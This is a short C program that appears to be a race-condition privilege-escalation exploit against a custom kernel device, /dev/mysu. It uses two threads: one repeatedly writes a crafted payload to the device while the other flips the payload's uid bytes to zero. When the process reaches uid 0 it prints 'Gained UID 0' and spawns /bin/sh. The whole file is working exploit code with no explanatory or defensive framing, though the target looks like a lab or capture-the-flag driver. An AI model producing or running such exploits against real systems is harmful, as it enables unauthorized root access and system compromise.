#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <limits.h>
#include <unistd.h>
#include <pthread.h>

unsigned char payload[] = {
    0xe8, 0x03, 0x0, 0x0,
    0x6e, 0x63, 0x7b, 0x89, 0x0, 0x80, 0x1, 0x0};

int stop = 0;

void *uid1000_thread()
{
    while (!stop)
    {
        int fd1 = open("/dev/mysu", O_RDWR);
        payload[0] = 0xe8;
        payload[1] = 0x03;
        write(fd1, payload, sizeof(payload));
        close(fd1);
        if (getuid() == 0)
        {
            stop = 1;
            printf("Gained UID 0\n");
            system("/bin/sh");
        }
    }
}

void *uid0_thread()
{
    while (!stop)
    {
        payload[0] = 0x00;
        payload[1] = 0x00;
        if (getuid() == 0)
        {
            stop = 1;
            printf("Gained UID 0\n");
            system("/bin/sh");
        }
    }
}

int main(int argc, char *argv[])
{
    pthread_t t1;
    pthread_t t2;
    pthread_create(&t1, NULL, uid0_thread, NULL);
    pthread_create(&t2, NULL, uid1000_thread, NULL);

    pthread_join(t1, NULL);
    pthread_join(t2, NULL);
}